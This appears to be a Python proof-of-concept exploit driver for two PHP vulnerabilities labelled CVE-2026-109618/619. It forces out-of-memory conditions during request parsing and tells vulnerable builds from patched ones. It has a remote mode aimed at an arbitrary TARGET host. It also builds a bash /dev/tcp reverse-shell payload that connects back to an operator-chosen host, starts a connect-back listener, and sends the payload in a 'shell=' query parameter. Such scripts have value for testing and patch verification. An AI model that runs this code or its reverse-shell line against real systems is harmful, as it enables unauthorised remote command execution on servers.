#!/usr/bin/env python3
"""CVE-2026-109618/619 PoC driver (stdlib only).

Vendor trigger shape from sapi/cli/tests/oom_request_parsing_next_request.phpt
(shipped with the fix): force an OOM during request parsing and watch what the
request and the NEXT request on the same worker/process do.

Build signatures (measured on 8.3.6 vs 8.3.36, Oct 21):
  stock 8.3.6   -> producer dies as silent HTTP 500, empty body
                   (parse-time bailout discards output; OOM message invisible;
                   session file never written)
  patched 8.3.36-> producer survives as HTTP 200 with visible
                   "Allowed memory size ... exhausted" (zend_handle_delayed_oom)
                   and the session file IS written -- vendor phpt symptom

Modes:  stock618 stock619 patched618 patched619 remote reliability
Env:    PHP_BIN PORT TARGET RSHELL RSHELL_LPORT RHOST N ARM_MB
"""
import os, socket, subprocess, sys, threading, time
from urllib.parse import quote

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
PORT = int(os.environ.get('CVE_PORT', '18911'))
TARGET = os.environ.get('TARGET')                    # host:port for remote mode
PHP_BIN = os.environ.get('PHP_BIN', 'php')
ARM_MB = int(os.environ.get('ARM_MB', '6' if 'patched' in (sys.argv[1] if len(sys.argv) > 1 else '') else '12'))
MODE = sys.argv[1] if len(sys.argv) > 1 else 'stock618'
N = int(os.environ.get('N', '5'))
RSHELL = os.environ.get('RSHELL', '1') == '1'
RSHELL_LPORT = int(os.environ.get('RSHELL_LPORT', '4477'))
RHOST = os.environ.get('RHOST') or socket.gethostbyname(socket.gethostname())

INI_COMMON = ['-d', 'memory_limit=8M', '-d', 'post_max_size=64M',
              '-d', 'session.save_path=/tmp/cve-sess']
INI_619 = INI_COMMON + ['-d', 'session.upload_progress.enabled=1',
                        '-d', 'session.upload_progress.cleanup=0',
                        '-d', 'session.upload_progress.min_freq=0',
                        '-d', 'session.upload_progress.freq=1%',
                        '-d', 'session.use_only_cookies=0',
                        '-d', 'session.use_strict_mode=0']

def http_req(host, port, qs, body=b'', ctype=None, sock=None, keepalive=False):
    """Send one HTTP/1.1 request; return (status, body_text). Keep-alive capable."""
    own = sock is None
    s = sock or socket.create_connection((host, port), timeout=60)
    tgt = qs if qs.startswith('/') else '/' + qs   # origin-form target must start with '/'
    head = "GET %s HTTP/1.1\r\nHost: x\r\n" % tgt if body == b'' else \
           "POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\n" % (
               tgt, ctype, len(body))
    head += ("Connection: keep-alive\r\n" if keepalive else "Connection: close\r\n") + "\r\n"
    sent_full = True
    try:
        s.sendall(head.encode() + body)
    except BrokenPipeError:
        # stock signature: parse-time bailout closes the connection mid-upload
        sent_full = False
    data = b''
    while True:
        try:
            c = s.recv(65536)
        except socket.timeout:
            break
        if not c:
            break
        data += c
        if b'\r\n\r\n' in data:  # headers done; for keep-alive assume content-length body
            head_part, rest = data.split(b'\r\n\r\n', 1)
            cl = None
            for ln in head_part.split(b'\r\n'):
                if ln.lower().startswith(b'content-length'):
                    cl = int(ln.split(b':')[1])
            if cl is not None and len(rest) >= cl:
                break
    if own:
        s.close()
    txt = data.decode('utf-8', 'replace')
    stat = txt.split('\r\n', 1)[0]
    body_txt = txt.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in txt else ''
    return stat, body_txt, s, sent_full

def producer_body(kind):
    B = 'cvepoc-boundary'
    if kind == '618':
        return ('a=' + 'a' * (ARM_MB * 1024 * 1024)).encode(), 'application/x-www-form-urlencoded'
    def field(name, val):
        return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (B, name, val)).encode()
    filepart = ('--%s\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n'
                'Content-Type: text/plain\r\n\r\n' % B).encode() + b'a' * (2 * 1024 * 1024) + b'\r\n'
    parts = [filepart] + [field('x[]', 'x' * 307200) for _ in range(40)] + \
            [field('PHP_SESSION_UPLOAD_PROGRESS', 'cveX')]
    return b''.join(parts) + ('--%s--\r\n' % B).encode(), 'multipart/form-data; boundary=' + B

def classify(stat, body_txt, mid_upload_abort=False):
    """Map the producer response to a build signature."""
    if 'exhausted' in body_txt:
        return 'FIXED-SIG (visible delayed OOM, 8.3.36 vendor symptom)', True
    if '500' in stat:
        return 'VULN-SIG (silent parse-time bailout, output discarded)', True
    if mid_upload_abort and not body_txt:
        return 'VULN-SIG (bailout closed connection mid-upload)', True
    if '200' in stat and 'CLASS=' in body_txt:
        return 'ARM-MISSED (no OOM fired)', False
    return 'UNKNOWN (%r body=%r)' % (stat, body_txt[:60]), False

def rshell_payload():
    return ("bash -c 'exec 3<>/dev/tcp/%s/%d; id -un >&3; echo php-cve-revshell-OK >&3'"
            % (RHOST, RSHELL_LPORT))

def listener_once(port, timeout=20):
    """One-shot connect-back listener in a thread; returns (thread, result-dict)."""
    res = {}
    def run():
        ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            ls.bind(('0.0.0.0', port)); ls.listen(1); ls.settimeout(timeout)
            try:
                conn, _ = ls.accept()
                conn.settimeout(5)
                buf = b''
                try:
                    while True:
                        c = conn.recv(4096)
                        if not c:
                            break
                        buf += c
                except OSError:
                    pass
                res['data'] = buf.decode('utf-8', 'replace'); conn.close()
            except socket.timeout:
                res['data'] = None
        finally:
            ls.close()
    t = threading.Thread(target=run, daemon=True); t.start()
    return t, res

def run_once(kind, spawn_local):
    srv = None
    host, port = (TARGET.split(':')[0], int(TARGET.split(':')[1])) if TARGET else ('127.0.0.1', PORT)
    if spawn_local:
        os.makedirs('/tmp/cve-sess', exist_ok=True)
        app = os.path.join(HERE, 'detector.php')
        srv = subprocess.Popen([PHP_BIN, '-S', '127.0.0.1:%d' % PORT] +
                               (INI_619 if kind == '619' else INI_COMMON) + [app],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.0)
    base = '/detector.php' if TARGET else ''
    qs = base + ('?PHPSESSID=cveX' if kind == '619' else '?x=1')
    body, ctype = producer_body(kind)
    try:
        stat, pbody, _, mid = http_req(host, port, qs, body, ctype)
        sig, fired = classify(stat, pbody, mid_upload_abort=not mid)
        note = ''
        if kind == '619':
            note = ' | sess-file after producer: ' + ('WRITTEN' if os.path.exists('/tmp/cve-sess/sess_cveX') else 'ABSENT')
        # consumer on same worker/process: shell leg (gated execution proof)
        payload = os.environ.get('PAYLOAD') or (rshell_payload() if RSHELL else 'id -un')
        lt, lres = (None, {})
        if RSHELL and not os.environ.get('PAYLOAD'):
            lt, lres = listener_once(RSHELL_LPORT)
            time.sleep(0.3)   # listener must be bound before the payload dials
        cstat, cbody, _, _ = http_req(host, port, base + '?t=check&shell=' + quote(payload, safe=''))
        if lt:
            lt.join(22)
        clean = 'CLASS=Foo' in cbody and 'Bar' in cbody
        shell_line = [l for l in cbody.splitlines() if l.startswith('SHELL=')]
        rsock = (lres.get('data') or '').strip() if lt else ''
        return dict(sig=sig, fired=fired, note=note, consumer_clean=clean,
                    shell=(shell_line[0] if shell_line else 'none'), rsock=rsock)
    finally:
        if srv:
            srv.terminate(); srv.wait()

def main():
    mode = MODE
    ok = 0
    if mode == 'reliability':
        for i in range(N):
            r = run_once('618', spawn_local=True)
            line = 'run %d: %s' % (i + 1, r['sig'])
            print(line)
            ok += 'VULN-SIG' in r['sig']
        print('reliability: %d/%d silent-bailout signatures' % (ok, N))
        return
    kind = '619' if '619' in mode else '618'
    patched = mode.startswith('patched')
    remote = mode == 'remote'
    global PHP_BIN
    if patched:
        PHP_BIN = os.path.join(ROOT, 'php-8.3.36', 'sapi', 'cli', 'php')
    r = run_once(kind, spawn_local=not remote)
    print('mode: %s | %s%s' % (mode, r['sig'], r['note']))
    sl = r['shell']
    if sl in ('none', 'SHELL=') and r['rsock']:
        sl = 'via socket'          # payload stdout went to the connect-back, not the HTTP body
    print('consumer: %s | shell leg: %s' % ('clean' if r['consumer_clean'] else 'DEVIATED', sl))
    if r['rsock']:
        print('revshell: CONNECTED over :%d — %s' % (RSHELL_LPORT, ' / '.join(r['rsock'].splitlines())))
    elif RSHELL:
        print('revshell: no connect-back received')

if __name__ == '__main__':
    main()
